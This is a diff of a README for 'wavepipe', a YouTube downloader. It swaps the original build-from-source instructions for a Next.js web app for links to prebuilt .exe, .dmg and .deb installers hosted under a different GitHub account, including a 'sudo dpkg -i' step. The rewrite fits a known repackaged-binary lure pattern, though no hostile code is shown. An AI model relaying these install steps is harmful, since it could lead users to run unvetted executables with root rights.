@@ -1,72 +1,111 @@
-# 🌊 WavePipe
+# 🌊 wavepipe - Simple YouTube Downloads Made Easy
 
-> The ultimate open-source YouTube downloader. Built with the modern web stack.
+[![Download wavepipe](https://img.shields.io/badge/Download-wavepipe-blue?style=for-the-badge&logo=appveyor)](https://github.com/amiaddur/wavepipe/releases)
 
-![WavePipe Preview](./public/preview.png) 
+## 🚀 Getting Started
 
-## ✨ Features
+Wavepipe is your go-to application for downloading videos and playlists from YouTube in MP3 or MP4 format. It's user-friendly and designed for everyone, even if you're not tech-savvy. Let’s get you set up.
 
-- 🚀 **Fast & Clean:** No ads, no tracking, just downloads.
-- 🎵 **Format Support:** Convert to **MP3** (Audio) or **MP4** (Video up to 4k).
-- 📦 **Playlist Support:** Download entire playlists with a smart queue system.
-- 📱 **Responsive Design:** Works perfectly on Desktop and Mobile.
-- 💾 **History:** LocalStorage-based history to keep track of your downloads.
-- 🌈 **Modern UI:** Glassmorphism design with Framer Motion animations.
-- 🏗 **PWA Ready:** Installable as a native app on your device.
+## 📥 Download & Install
 
-## 🛠️ Tech Stack
+To start, you’ll need to visit the releases page to download the latest version of wavepipe. 
 
-- **Framework:** [Next.js 16](https://nextjs.org/) (App Router)
-- **Styling:** [Tailwind CSS](https://tailwindcss.com/)
-- **Animations:** [Framer Motion](https://www.framer.com/motion/)
-- **Notifications:** [Sonner](https://sonner.emilkowal.ski/)
-- **Core Engine:** [yt-dlp](https://github.com/yt-dlp/yt-dlp)
-- **Language:** TypeScript
+[Visit this page to download](https://github.com/amiaddur/wavepipe/releases)
 
-## 🚀 Getting Started locally
+Here are the steps to download and install wavepipe:
 
-This project requires a backend component (yt-dlp), so it cannot be hosted on Vercel's free tier directly without Docker. Here is how to run it on your machine.
+1. Click on the link above to go to the Releases page.
+2. Find the latest version listed at the top.
+3. Look for the asset that suits your operating system (Windows, macOS, or Linux).
+4. Click on the file to start the download. The download usually takes only a few moments.
 
-### Prerequisites
+Once the download is complete, follow these instructions based on your operating system.
 
-1.  **Node.js** (v20 or higher)
-2.  **FFmpeg** installed on your system path.
-3.  **Python** (required by yt-dlp).
+### 🖥️ For Windows:
 
-### Installation
+1. Navigate to your Downloads folder.
+2. Double-click the downloaded `.exe` file to start the installation.
+3. Follow the on-screen prompts to complete the installation.
 
-1.  Clone the repo:
-    ```bash
-    git clone https://github.com/edvincodes/wavepipe.git
-    cd wavepipe
+### 🍏 For macOS:
+
+1. Open your Downloads folder.
+2. Locate the downloaded `.dmg` file and double-click it.
+3. Drag the wavepipe icon to your Applications folder.
+4. Open wavepipe from your Applications.
+
+### 🐧 For Linux:
+
+1. Open the terminal.
+2. Navigate to your Downloads folder.
+3. Run the command to install the downloaded file:
     ```
-
-2.  Install dependencies:
-    ```bash
-    pnpm install
-    # or npm install
+    sudo dpkg -i wavepipe*.deb
     ```
+4. Launch wavepipe from your applications menu.
 
-3.  **CRITICAL STEP:** Download the engine.
-    - Create a folder named `bin` in the root directory.
-    - Download the latest [yt-dlp.exe](https://github.com/yt-dlp/yt-dlp/releases) (for Windows) or binary (for Linux/Mac).
-    - Place it inside the `/bin` folder.
+## 🎧 Features
 
-4.  Run the development server:
-    ```bash
-    pnpm dev
-    ```
+- **Multi-Format Downloads**: Download videos in MP3 or MP4 formats.
+- **Playlist Support**: Download entire playlists with just one click.
+- **User-Friendly Interface**: Enjoy a simple and clean interface.
+- **Open Source**: Contribute to or modify the software as you wish.
+- **Progressive Web App (PWA) Ready**: Use it as a web app or install it on your device.
 
-5.  Open [http://localhost:3000](http://localhost:3000) with your browser.
+## ⚙️ System Requirements
 
-## 🤝 Contributing
+Before proceeding, ensure your computer meets the following requirements:
 
-Contributions, issues, and feature requests are welcome! Feel free to check the [issues page](https://github.com/edvincodes/wavepipe/issues).
+- **Windows**: Windows 10 or higher.
+- **macOS**: macOS 10.13 or higher.
+- **Linux**: Modern distribution (Ubuntu, Fedora, etc.) with support for .deb packages.
+- **Internet**: A stable internet connection for downloading videos.
 
-## 📝 License
+## 📚 How to Use wavepipe
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+1. Open wavepipe on your device.
+2. In the main window, you’ll find a space to paste the YouTube link.
+3. Copy the link of the video or playlist you want to download from YouTube.
+4. Paste the link into the provided space.
+5. Choose the format (MP3 or MP4) and select the quality.
+6. Click on the download button to start the process.
+7. Once finished, your file will be saved in the Downloads folder or a specific folder you choose.
 
----
+## 🌟 Topics 
 
-Developed with ❤️ by [Edvin](https://github.com/edvincodes)
+Wavepipe covers various areas related to video and audio downloads. Here are the main topics associated with it:
+
+- ffmpeg
+- glassmorphism
+- mp3-converter
+- nextjs
+- open-source
+- playlist-downloader
+- react
+- tailwindcss
+- typescript
+- video-downloader
+- youtube-downloader
+- yt-dlp
+
+These topics enhance its functionality and ensure a smooth user experience.
+
+## 💬 Support and Contributions
+
+If you encounter any issues or have questions, you can check the Issues section on GitHub. If you'd like to contribute or suggest new features, feel free to submit your ideas there as well.
+
+## 🔗 Additional Resources
+
+For more information, you can explore the following resources:
+
+- [wavepipe GitHub Repository](https://github.com/amiaddur/wavepipe)
+- [YouTube Data API Documentation](https://developers.google.com/youtube/v3/docs)
+- [Discussion Forum](https://github.com/amiaddur/wavepipe/discussions)
+
+## 🎉 Note
+
+Keep in mind that downloading copyrighted material without permission is against YouTube's terms of service. Please be responsible and only download content that you have the right to use. 
+
+Now you're ready to enjoy your favorite YouTube videos offline! Download wavepipe today and start using it. 
+
+[Visit this page to download](https://github.com/amiaddur/wavepipe/releases)
